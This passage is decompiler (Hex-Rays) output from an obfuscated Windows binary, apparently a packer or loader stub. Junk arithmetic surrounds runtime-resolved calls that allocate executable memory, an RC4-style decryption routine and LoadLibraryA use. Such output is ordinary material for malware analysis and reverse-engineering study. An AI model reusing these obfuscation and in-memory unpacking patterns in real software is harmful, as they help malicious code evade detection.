    dword_43D034 -= (int)(v19 + 1256);
    dword_43EA48 = (__int64 (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v6;
    LOBYTE(dword_43D024) = dword_43D024 - 99;
    LODWORD(v6) = sub_40309A(976580703);
    LOBYTE(dword_43D01C) = 31;
    dword_43D01C += 10163;
    if ( (_DWORD)v6 )
    {
      dword_43D03C = 5251;
      dword_43E9C9 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v6;
      v6 = dword_43EA48(dword_43D7B0, dword_43D8A0 + 22516, 0, 0x2000, 12288, 64);
      dword_43D01C -= HIDWORD(v6);
      if ( (_DWORD)v6 )
      {
        dword_43D044 = 4535;
        dword_43E824 = v6;
        dword_43D030 += 12702;
        v15 = dword_43EA05(20224, &dword_43E888, -1073741824, 1, 0, 3, 0, 0);
        v17 = v16 + 4598;
        LOBYTE(v17) = 125;
        dword_43D010 += v17;
        dword_43D004 -= 20580;
        dword_43D028 -= 11594;
        LOBYTE(v17) = 125 - byte_43E568;
        dword_43E9BD(v17, 21366 - dword_43D208, v15, dword_43E824, 0x2000, &unk_423933, 0, v15);
        BYTE1(v27) = byte_43D074;
        LOBYTE(dword_43D008) = 15;
        dword_43E880(10971, v27);
        LOBYTE(dword_43D030) = -20;
        dword_43EA0D(v28 - dword_43D45C, &dword_43E888);
        dword_43D004 += 3963;
        v1 = 0x2000;
        LOBYTE(dword_43D00C) = -75;
        v33 = (_BYTE *)dword_43E824;
        v34 = 0;
        LOBYTE(dword_43D008) = dword_43D008 + 115;
        v35 = 0;
        dword_43D030 = 10046;
        do
        {
          LOBYTE(v35) = *v33++;
          dword_43D034 = (int)&InitializeCriticalSection;
          v34 += v35;
          dword_43D028 = 31329;
          v35 = 0;
          dword_43D048 = 26020;
          --v1;
        }
        while ( v1 );
        dword_43E9F9 = v34;
        dword_43D02C += 7651;
        dword_43E9C9((dword_43EA8C != 0) - dword_43EA8C + 25827, 8573, dword_43E824, 0, 0x8000);
        LODWORD(v6) = 0;
        v7 = 0x2000;
        dword_43D044 = 17633;
        v8 = &unk_423A33;
        v9 = 28717;
        do
        {
          *v8++ = 0;
          --v9;
          --v7;
        }
        while ( v7 );
        dword_43D00C = 25768;
      }
    }
  }
  return v6;
}
// 402003: conditional instruction was optimized away because %0x18.4==1
// 4048CF: variable 'v16' is possibly undefined
// 407090: variable 'v27' is possibly undefined
// 4070A4: variable 'v28' is possibly undefined
// 401AB5: variable 'v18' is possibly undefined
// 4073F9: variable 'v30' is possibly undefined
// 40741D: variable 'v32' is possibly undefined
// 407411: variable 'v31' is possibly undefined
// 401F13: variable 'v5' is possibly undefined
// 403E81: variable 'v14' is possibly undefined
// 403E81: variable 'v13' is possibly undefined
// 43D004: using guessed type int dword_43D004;
// 43D008: using guessed type int dword_43D008;
// 43D00C: using guessed type int dword_43D00C;
// 43D010: using guessed type int dword_43D010;
// 43D014: using guessed type int dword_43D014;
// 43D01C: using guessed type int dword_43D01C;
// 43D020: using guessed type int dword_43D020;
// 43D024: using guessed type int dword_43D024;
// 43D028: using guessed type int dword_43D028;
// 43D02C: using guessed type int dword_43D02C;
// 43D030: using guessed type int dword_43D030;
// 43D034: using guessed type int dword_43D034;
// 43D038: using guessed type int dword_43D038;
// 43D03C: using guessed type int dword_43D03C;
// 43D040: using guessed type int dword_43D040;
// 43D044: using guessed type int dword_43D044;
// 43D048: using guessed type int dword_43D048;
// 43D04C: using guessed type int dword_43D04C;
// 43D074: using guessed type char byte_43D074;
// 43D208: using guessed type int dword_43D208;
// 43D328: using guessed type int dword_43D328;
// 43D368: using guessed type int dword_43D368;
// 43D374: using guessed type int dword_43D374;
// 43D45C: using guessed type int dword_43D45C;
// 43D51C: using guessed type int dword_43D51C;
// 43D7B0: using guessed type int dword_43D7B0;
// 43D8A0: using guessed type int dword_43D8A0;
// 43D9DC: using guessed type int dword_43D9DC;
// 43DE68: using guessed type char byte_43DE68;
// 43DE74: using guessed type int dword_43DE74;
// 43E028: using guessed type int dword_43E028;
// 43E4E4: using guessed type int dword_43E4E4;
// 43E550: using guessed type int dword_43E550;
// 43E568: using guessed type char byte_43E568;
// 43E5E4: using guessed type char byte_43E5E4;
// 43E7AC: using guessed type char byte_43E7AC;
// 43E820: using guessed type int dword_43E820;
// 43E824: using guessed type int dword_43E824;
// 43E880: using guessed type int (__fastcall *dword_43E880)(_DWORD, _DWORD);
// 43E888: using guessed type int dword_43E888;
// 43E987: using guessed type int (__stdcall *dword_43E987)(_DWORD, _DWORD);
// 43E9B5: using guessed type int (__fastcall *dword_43E9B5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E9BD: using guessed type int (__fastcall *dword_43E9BD)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E9C9: using guessed type int (__fastcall *dword_43E9C9)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E9F9: using guessed type int dword_43E9F9;
// 43EA05: using guessed type int (__thiscall *dword_43EA05)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43EA0D: using guessed type int (__thiscall *dword_43EA0D)(_DWORD, _DWORD);
// 43EA21: using guessed type int (__thiscall *dword_43EA21)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43EA48: using guessed type __int64 (__fastcall *dword_43EA48)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43EA8C: using guessed type int dword_43EA8C;

//----- (004069DD) --------------------------------------------------------
int __usercall sub_4069DD@<eax>(int a1@<eax>)
{
  if ( a1 % 52 < 17 )
    return 980;
  else
    return 61;
}

//----- (00406D84) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_406D84@<eax>(int a1@<eax>, int a2@<ebp>)
{
  *(_DWORD *)(a2 - 44) = 117;
  *(_DWORD *)(a2 - 40) = 2;
  *(_DWORD *)(a2 - 28) = 5;
  *(_DWORD *)(a2 - 12) = 2;
  *(_DWORD *)(a2 - 8) = 103;
  *(_DWORD *)(a2 - 52) = 27;
  *(_DWORD *)(a2 - 24) = 27;
  *(_DWORD *)(a2 - 20) = 117;
  *(_DWORD *)(a2 - 36) = 103;
  *(_DWORD *)(a2 - 16) = 30;
  *(_DWORD *)(a2 - 48) = 245;
  *(_DWORD *)(a2 - 32) = 76;
  *(_DWORD *)(a2 - 4) = a1 % 103;
  if ( a1 % 103 < 24 )
    JUMPOUT(0x4073C5);
  return 28;
}
// 406113: positive sp value 10 has been found
// 4044FD: control flows out of bounds to 405849
// 4064A6: control flows out of bounds to 4073C5

//----- (00406EB0) --------------------------------------------------------
int sub_406EB0()
{
  unsigned int v0; // edx
  unsigned int v1; // eax
  unsigned int v2; // ecx
  int v3; // ecx
  unsigned int v4; // eax
  bool v6; // cf
  unsigned int v7; // ecx
  int v8; // eax
  unsigned int v9; // [esp+28h] [ebp-238h]
  unsigned int v10; // [esp+4Ch] [ebp-214h]
  int v11; // [esp+5Ch] [ebp-204h]
  int v12; // [esp+6Ch] [ebp-1F4h]
  int v13; // [esp+7Ch] [ebp-1E4h]
  int v14; // [esp+90h] [ebp-1D0h]
  unsigned int v15; // [esp+A8h] [ebp-1B8h]
  unsigned int v16; // [esp+BCh] [ebp-1A4h]
  int v17; // [esp+C0h] [ebp-1A0h]
  unsigned int v18; // [esp+C8h] [ebp-198h]
  int v19; // [esp+F8h] [ebp-168h]
  int v20; // [esp+104h] [ebp-15Ch]
  int v21; // [esp+10Ch] [ebp-154h]
  int v22; // [esp+110h] [ebp-150h]
  int v23; // [esp+11Ch] [ebp-144h]
  int v24; // [esp+124h] [ebp-13Ch]
  int v25; // [esp+178h] [ebp-E8h]
  int v26; // [esp+18Ch] [ebp-D4h]
  int v27; // [esp+190h] [ebp-D0h]
  int v28; // [esp+194h] [ebp-CCh]
  int v29; // [esp+1A4h] [ebp-BCh]
  int v30; // [esp+1A4h] [ebp-BCh]
  int v31; // [esp+1D0h] [ebp-90h]
  int v32; // [esp+1ECh] [ebp-74h]
  int v33; // [esp+220h] [ebp-40h]
  int v34; // [esp+224h] [ebp-3Ch]

  if ( v23 != 2927 )
  {
    v10 -= 31054;
    if ( v21 != 6404 )
      v32 += 2927 - v18 + (__PAIR64__(v15, 2927) < __PAIR64__(2927 - v18, v18));
  }
  v0 = v25 & 0x220 ^ 0x6D98;
  if ( v0 > 0x3BA )
  {
    v32 += v0;
    v24 += v19
         + (v0 | 0xFFFFF831)
         + (v25 & 0x220 ^ 0x6A63)
         + 1
         + __CFADD__(v19 + (v0 | 0xFFFFF831), (v25 & 0x220 ^ 0x6A63) + 1);
  }
  v29 = v30 + 1;
  v2 = v34 + ((-v17 | 0x68u) < 0xDEC) + (-v17 | 0x68) - 3564;
  v6 = v10 < v2;
  if ( v10 <= v2 )
  {
    v7 = v32 ^ v26 & v2;
    v31 += v22 + (v7 < v9);
    v3 = v14 ^ v28 ^ v22 ^ ((_WORD)v7 - (_WORD)v9) & 0x62E3;
    v6 = __CFADD__(v20, v3);
    v2 = v20 + v3;
  }
  if ( (v29 | (173 - (v6 + v31))) == v27 )
    v2 = v12 + v24 - 255;
  v1 = v2 + v2 + 1786;
  if ( v1 == 255 )
  {
    v2 = v16;
    v25 &= 0xCB9u;
  }
  v4 = v1 - v2;
  v8 = (v4 | (27479 - v25 - 1)) & (671 - (v4 | (27479 - v25 - 1)));
  if ( v8 == 186 )
    v8 = (v13 | 0xBA) - v33;
  return v11 ^ v8;
}
// 4026B9: variable 'v25' is possibly undefined
// 4026E0: variable 'v32' is possibly undefined
// 405E7B: variable 'v19' is possibly undefined
// 405E8A: variable 'v24' is possibly undefined
// 402A97: variable 'v16' is possibly undefined
// 402E2F: variable 'v31' is possibly undefined
// 402E49: variable 'v27' is possibly undefined
// 402113: variable 'v12' is possibly undefined
// 403422: variable 'v30' is possibly undefined
// 406541: variable 'v11' is possibly undefined
// 4069A3: variable 'v23' is possibly undefined
// 406C65: variable 'v34' is possibly undefined
// 406C56: variable 'v17' is possibly undefined
// 406C78: variable 'v10' is possibly undefined
// 406C84: variable 'v26' is possibly undefined
// 406C99: variable 'v22' is possibly undefined
// 406C8D: variable 'v9' is possibly undefined
// 402DA8: variable 'v14' is possibly undefined
// 406C9F: variable 'v28' is possibly undefined
// 401115: variable 'v20' is possibly undefined
// 4076CF: variable 'v21' is possibly undefined
// 4076D5: variable 'v18' is possibly undefined
// 4053BD: variable 'v15' is possibly undefined
// 407799: variable 'v13' is possibly undefined
// 40779F: variable 'v33' is possibly undefined

//----- (00406F5D) --------------------------------------------------------
int __usercall sub_406F5D@<eax>(int a1@<ebx>, int a2@<esi>)
{
  int v2; // ebx
  bool v3; // cf
  int result; // eax
  int v5; // esi
  int v6; // ebx
  BOOL v7; // ett
  unsigned int v8; // eax

  v5 = a2 - dword_43E2A4;
  v2 = a1 - 10134;
  LOBYTE(dword_43D01C) = dword_43D01C - 79;
  v3 = __CFADD__(v5, dword_43D038);
  dword_43D038 += v5;
  BYTE1(v2) = v2;
  v7 = v3;
  v3 = __CFADD__(v3, v2);
  v6 = v7 + v2;
  v3 |= __CFADD__(v6, 25531);
  v6 += 25531;
  LOBYTE(v6) = v3 + v6 + 23;
  v3 = BYTE1(v6) < (unsigned __int8)byte_43D5A4;
  BYTE1(v6) -= byte_43D5A4;
  v8 = dword_43E9C1 ^ (dword_43E9C1 << 11);
  dword_43E9C1 = dword_43E9C5;
  dword_43D040 -= 19337 - (v3 + v6 + 20857) - 27693;
  dword_43E9C5 = dword_43E9F5;
  LOBYTE(dword_43D034) = -82;
  dword_43D04C = 9895;
  dword_43E9F5 = dword_43E820;
  dword_43D03C += (int)&InitializeCriticalSection;
  dword_43D00C = dword_43D52C + 39665;
  dword_43D024 = 23557;
  dword_43E820 ^= (v8 >> 8) ^ v8 ^ ((unsigned int)dword_43E820 >> 19);
  result = dword_43E820;
  dword_43D030 -= 19487;
  return result;
}
// 43D00C: using guessed type int dword_43D00C;
// 43D01C: using guessed type int dword_43D01C;
// 43D024: using guessed type int dword_43D024;
// 43D030: using guessed type int dword_43D030;
// 43D034: using guessed type int dword_43D034;
// 43D038: using guessed type int dword_43D038;
// 43D03C: using guessed type int dword_43D03C;
// 43D040: using guessed type int dword_43D040;
// 43D04C: using guessed type int dword_43D04C;
// 43D52C: using guessed type int dword_43D52C;
// 43D5A4: using guessed type char byte_43D5A4;
// 43E2A4: using guessed type int dword_43E2A4;
// 43E820: using guessed type int dword_43E820;
// 43E9C1: using guessed type int dword_43E9C1;
// 43E9C5: using guessed type int dword_43E9C5;
// 43E9F5: using guessed type int dword_43E9F5;

//----- (004072FB) --------------------------------------------------------
int __usercall sub_4072FB@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v2; // eax
  int v3; // et2

  *(_DWORD *)(a2 - 8) = 191;
  *(_DWORD *)(a2 - 20) = 34;
  *(_DWORD *)(a2 - 12) = 219;
  *(_DWORD *)(a2 - 4) = 211;
  v3 = a1 % 211;
  v2 = a1 / 211;
  *(_DWORD *)(a2 - 16) = v3;
  if ( v3 >= 33 )
    return 138;
  if ( *(int *)(a2 - 12) >= 236 )
    sub_405FF9(v2);
  return 570;
}

//----- (0040737C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_40737C@<eax>(int a1@<ebp>)
{
  int v2; // eax

  *(_DWORD *)(a1 - 40) = *(_DWORD *)(a1 - 32);
  v2 = *(_DWORD *)(a1 - 32);
  *(_DWORD *)(a1 - 48) = v2;
  if ( v2 && !*(_DWORD *)(a1 - 24) )
    *(_DWORD *)(a1 - 28) = *(_DWORD *)(a1 - 24) * *(_DWORD *)(a1 - 20);
  return 347;
}
// 406113: positive sp value 10 has been found
// 40737C: could not find valid save-restore pair for ebx
// 40737C: could not find valid save-restore pair for edi
// 40737C: could not find valid save-restore pair for esi

//----- (004078C5) --------------------------------------------------------
int sub_4078C5()
{
  int v0; // ecx
  unsigned int v1; // ecx
  unsigned int v2; // ecx
  bool v3; // cf
  int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // eax
  unsigned int v8; // [esp-238h] [ebp-23Ch]
  unsigned int v9; // [esp-214h] [ebp-218h]
  int v10; // [esp-204h] [ebp-208h]
  int v11; // [esp-1F4h] [ebp-1F8h]
  int v12; // [esp-1E4h] [ebp-1E8h]
  int v13; // [esp-1D0h] [ebp-1D4h]
  unsigned int v14; // [esp-1B8h] [ebp-1BCh]
  unsigned int v15; // [esp-1A4h] [ebp-1A8h]
  int v16; // [esp-1A0h] [ebp-1A4h]
  unsigned int v17; // [esp-198h] [ebp-19Ch]
  int v18; // [esp-168h] [ebp-16Ch]
  int v19; // [esp-15Ch] [ebp-160h]
  int v20; // [esp-154h] [ebp-158h]
  int v21; // [esp-150h] [ebp-154h]
  int v22; // [esp-144h] [ebp-148h]
  int v23; // [esp-13Ch] [ebp-140h]
  int v24; // [esp-E8h] [ebp-ECh]
  int v25; // [esp-D4h] [ebp-D8h]
  int v26; // [esp-D0h] [ebp-D4h]
  int v27; // [esp-CCh] [ebp-D0h]
  int v28; // [esp-BCh] [ebp-C0h]
  int v29; // [esp-BCh] [ebp-C0h]
  int v30; // [esp-90h] [ebp-94h]
  int v31; // [esp-74h] [ebp-78h]
  int v32; // [esp-40h] [ebp-44h]
  int v33; // [esp-3Ch] [ebp-40h]

  if ( v22 != 2927 )
  {
    v9 -= 31054;
    if ( v20 != 6404 )
      v31 += 2927 - v17 + (__PAIR64__(v14, 2927) < __PAIR64__(2927 - v17, v17));
  }
  v5 = v24 & 0x220 ^ 0x6D98;
  if ( v5 > 0x3BA )
  {
    v31 += v5;
    v23 += v18
         + (v5 | 0xFFFFF831)
         + (v24 & 0x220 ^ 0x6A63)
         + 1
         + __CFADD__(v18 + (v5 | 0xFFFFF831), (v24 & 0x220 ^ 0x6A63) + 1);
  }
  v28 = v29 + 1;
  v2 = v33 + ((-v16 | 0x68u) < 0xDEC) + (-v16 | 0x68) - 3564;
  v3 = v9 < v2;
  if ( v9 <= v2 )
  {
    v1 = v31 ^ v25 & v2;
    v30 += v21 + (v1 < v8);
    v0 = v13 ^ v27 ^ v21 ^ ((_WORD)v1 - (_WORD)v8) & 0x62E3;
    v3 = __CFADD__(v19, v0);
    v2 = v19 + v0;
  }
  if ( (v28 | (173 - (v3 + v30))) == v26 )
    v2 = v11 + v23 - 255;
  v6 = v2 + v2 + 1786;
  if ( v6 == 255 )
  {
    v2 = v15;
    v24 &= 0xCB9u;
  }
  v4 = ((v6 - v2) | (27479 - v24 - 1)) & (671 - ((v6 - v2) | (27479 - v24 - 1)));
  if ( v4 == 186 )
    v4 = (v12 | 0xBA) - v32;
  return v10 ^ v4;
}
// 402D86: variable 'v22' is possibly undefined
// 402D8E: variable 'v9' is possibly undefined
// 403AB4: variable 'v31' is possibly undefined
// 40495F: variable 'v18' is possibly undefined
// 4055EE: variable 'v24' is possibly undefined
// 40496E: variable 'v23' is possibly undefined
// 4045AC: variable 'v20' is possibly undefined
// 40301E: variable 'v17' is possibly undefined
// 403024: variable 'v14' is possibly undefined
// 404756: variable 'v30' is possibly undefined
// 404770: variable 'v26' is possibly undefined
// 404794: variable 'v11' is possibly undefined
// 404F64: variable 'v29' is possibly undefined
// 403757: variable 'v33' is possibly undefined
// 403748: variable 'v16' is possibly undefined
// 403C39: variable 'v25' is possibly undefined
// 401F4D: variable 'v21' is possibly undefined
// 403C42: variable 'v8' is possibly undefined
// 401F59: variable 'v13' is possibly undefined
// 401F53: variable 'v27' is possibly undefined
// 40767E: variable 'v19' is possibly undefined
// 405737: variable 'v15' is possibly undefined
// 4060C7: variable 'v10' is possibly undefined
// 406E3E: variable 'v12' is possibly undefined
// 406E44: variable 'v32' is possibly undefined

//----- (0040798B) --------------------------------------------------------
int __usercall sub_40798B@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v2; // eax
  int v3; // edx
  int v4; // et2
  int v6; // edx
  bool v7; // cf
  int v8; // edx

  *(_DWORD *)(a2 - 20) = 151;
  *(_DWORD *)(a2 - 16) = 101;
  *(_DWORD *)(a2 - 48) = 232;
  *(_DWORD *)(a2 - 44) = 125;
  *(_DWORD *)(a2 - 4) = 101;
  *(_DWORD *)(a2 - 28) = 23;
  *(_DWORD *)(a2 - 24) = 136;
  *(_DWORD *)(a2 - 36) = 159;
  *(_DWORD *)(a2 - 40) = 155;
  *(_DWORD *)(a2 - 12) = 23;
  *(_DWORD *)(a2 - 52) = 101;
  v4 = a1 % 20;
  v2 = a1 / 20;
  v3 = v4;
  *(_DWORD *)(a2 - 8) = v4;
  if ( v3 >= 3 )
    return 153;
  if ( *(_DWORD *)(a2 - 16) <= *(_DWORD *)(a2 - 44) )
    sub_4047EA(v2);
  v6 = *(_DWORD *)(a2 - 4);
  v7 = v6 == 0;
  v8 = v6 - 1;
  if ( !v7 && v8 && v8 == 1 )
    *(_DWORD *)(a2 - 16) = *(_DWORD *)(a2 - 4);
  return 221;
}

//----- (00407994) --------------------------------------------------------
int __usercall sub_407994@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 145;
  v1 = a1 / 145;
  if ( v2 >= 32 )
    return 108;
  sub_404E88(v1);
  return 255;
}
// 401EC6: conditional instruction was optimized away because %var_4.4==1D

//----- (00407A20) --------------------------------------------------------
_BYTE *__cdecl sub_407A20(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (00407BA8) --------------------------------------------------------
char __usercall sub_407BA8@<al>(_DWORD *a1@<ebp>)
{
  unsigned __int8 v1; // bl
  int v2; // esi
  char result; // al

  v1 = *(_BYTE *)(a1[4] + 256);
  *((_BYTE *)a1 - 1) = *(_BYTE *)(a1[4] + 257);
  v2 = a1[4];
  *(a1 - 2) = 0;
  for ( *(a1 - 3) = a1[2]; *(a1 - 2) < a1[3]; ++*(a1 - 3) )
  {
    v1 = (v1 + 1) % 256;
    *((_BYTE *)a1 - 1) += *(_BYTE *)(v2 + v1);
    sub_407A20((_BYTE *)(v2 + v1), (_BYTE *)(v2 + *((unsigned __int8 *)a1 - 1)));
    *(_BYTE *)*(a1 - 3) ^= *(_BYTE *)(v2
                                    + (unsigned __int8)(*(_BYTE *)(v2 + *((unsigned __int8 *)a1 - 1))
                                                      + *(_BYTE *)(v2 + v1)));
    ++*(a1 - 2);
  }
  *(_BYTE *)(a1[4] + 256) = v1;
  result = *((_BYTE *)a1 - 1);
  *(_BYTE *)(a1[4] + 257) = result;
  return result;
}

//----- (0040825D) --------------------------------------------------------
void __usercall sub_40825D(int a1@<ebp>)
{
  *(_DWORD *)(a1 - 20) = 4;
  JUMPOUT(0x40863F);
}
// 408267: control flows out of bounds to 40863F

//----- (00408305) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char sub_408305()
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_407BA8(&savedregs);
}
// 408308: bad sp value at call

//----- (004083B1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall start(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<ebp>, int a5@<edi>, int a6@<esi>)
{
  int i; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // ecx
  int v12; // esi
  bool v13; // cf
  int v14; // eax
  int v15; // ecx
  int v16; // ecx
  unsigned int v17; // ecx
  int v18; // eax
  int v19; // ebx
  int v20; // eax
  int v21; // ebx

  unk_43E884 = a3;
  unk_43EA50 = a6;
  dword_43E860 = a5;
  dword_43E9F1 = a1;
  dword_43EA1D = a2;
  dword_43D024 = 11530;
  dword_43E840 = a4;
  dword_43D008 -= a6;
  v13 = __CFADD__((_BYTE)dword_43D02C, 60);
  LOBYTE(dword_43D02C) = dword_43D02C + 60;
  v14 = sub_402F8C((int)&unk_43EA50 + v13 + 3599);
  dword_43D034 -= v13 + v15 + 8730;
  dword_43D034 = sub_404389(v14 - 1);
  v17 = v13 + v16 + 28212;
  if ( (unsigned int)dword_43D034 > 0x2A10 )
    dword_43D034 -= sub_402F8C((int)&InterlockedExchange);
  if ( v17 < 0x1CE5 )
    dword_43D04C = 23473;
  for ( i = 16614; ; i = v19 )
  {
    v8 = sub_401BE6(i);
    v9 = sub_401DDC(v8);
    v10 = sub_404224(v9);
    LOBYTE(dword_43D04C) = 1;
    dword_43D028 = v10;
    dword_43D040 += 4572;
    LOBYTE(dword_43D010) = dword_43D010 - 107;
    LOBYTE(dword_43D008) = dword_43D008 + 107;
    v20 = sub_40582E(10772);
    LOBYTE(dword_43D024) = -18;
    v12 = v11 - dword_43E354;
    sub_401BE6(v20);
    dword_43D010 += (int)&LoadLibraryA;
    LOBYTE(dword_43D024) = -116;
    v7 = sub_40300E((unsigned int)&LoadLibraryA, v12);
    dword_43D020 -= 16073;
    dword_43D00C -= 11649;
    v21 = (int)&dword_43E9B1;
    BYTE1(v21) = ((unsigned __int16)&dword_43E9B1 >> 8) ^ 0xBC;
    if ( dword_43E9B1 == 1 )
      break;
    dword_43D004 = v21;
    v18 = dword_43E300;
    v19 = (int)(&dword_43E9B1 + 6271);
    --dword_43E9B1;
    if ( &dword_43E9B1 != (_DWORD *)-25081 )
    {
      sub_401DDC(dword_43E300);
      v18 = sub_4078C5() - dword_43D404;
      v19 ^= 0x2516u;
    }
    LOBYTE(dword_43D044) = 82;
    sub_401E3C(v18);
  }
  sub_405302(v7, v21 | 0xEDE);
  __asm { retn }
}
// 408059: positive sp value 4 has been found
// 408530: variable 'v13' is possibly undefined
// 408530: variable 'v15' is possibly undefined
// 40854E: variable 'v16' is possibly undefined
// 408677: variable 'v17' is possibly undefined
// 40823D: variable 'v11' is possibly undefined
// 43D004: using guessed type int dword_43D004;
// 43D008: using guessed type int dword_43D008;
// 43D00C: using guessed type int dword_43D00C;
// 43D010: using guessed type int dword_43D010;
// 43D020: using guessed type int dword_43D020;
// 43D024: using guessed type int dword_43D024;
// 43D028: using guessed type int dword_43D028;
// 43D02C: using guessed type int dword_43D02C;
// 43D034: using guessed type int dword_43D034;
// 43D040: using guessed type int dword_43D040;
// 43D044: using guessed type int dword_43D044;
// 43D04C: using guessed type int dword_43D04C;
// 43D404: using guessed type int dword_43D404;
// 43E300: using guessed type int dword_43E300;
// 43E354: using guessed type int dword_43E354;
// 43E840: using guessed type int dword_43E840;
// 43E860: using guessed type int dword_43E860;
// 43E888: using guessed type int dword_43E888;
// 43E9B1: using guessed type _DWORD dword_43E9B1;
// 43E9CD: using guessed type int dword_43E9CD;
// 43E9F1: using guessed type int dword_43E9F1;
// 43E9FD: using guessed type int dword_43E9FD;
// 43EA1D: using guessed type int dword_43EA1D;

//----- (004088CA) --------------------------------------------------------
void __usercall sub_4088CA(_DWORD *a1@<edx>, int a2@<ecx>, int a3@<ebp>, int a4@<edi>)
{
  unsigned int v4; // edi

  v4 = a2 * a4;
  if ( *(_DWORD *)(a3 + 12) < v4 )
  {
    *a1 = a2 + ((unsigned int)(2048 - a2) >> 5);
    *(_DWORD *)(a3 - 24) = *(_DWORD *)(a3 - 28);
    JUMPOUT(0x4085FE);
  }
  *(_DWORD *)(a3 + 12) -= v4;
  JUMPOUT(0x40826C);
}
// 40889F: control flows out of bounds to 4085FE
// 408FE8: control flows out of bounds to 40826C

//----- (0040894B) --------------------------------------------------------
void __cdecl sub_40894B(int a1, int a2, _BYTE *a3)
{
  *a3 = 0;
  JUMPOUT(0x408762);
}
// 408761: control flows out of bounds to 408762

//----- (00410FB5) --------------------------------------------------------
void __userpurge sub_410FB5(
        int a1@<eax>,
        char a2@<dl>,
        int a3@<ecx>,
        int a4@<edi>,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32,
        int a33,
        int a34,
        int a35,
        int a36,
        int a37,
        int a38,
        int a39,
        int a40,
        int a41,
        int a42,
        int a43,
        int a44,
        int a45,
        int a46,
        int a47,
        int a48,
        int a49,
        int a50,
        int a51,
        int a52,
        int a53,
        int a54,
        int a55,
        int a56,
        int a57,
        int a58,
        int a59,
        int a60,
        int a61,
        int a62,
        int a63)
{
  *(_BYTE *)(a3 - 50) -= a2;
  MEMORY[0x350E618B] = a1;
  _EAX = a4;
  __asm
  {
    daa
    retf    522Fh
  }
}
// 410FCB: unbalanced stack, ignored a potential tail call
// 410FB5: too many input arguments, some ignored

// nfuncs=51 queued=51 decompiled=51 lumina nreq=0 worse=0 better=0
// ALL OK, 51 function(s) have been successfully decompiled
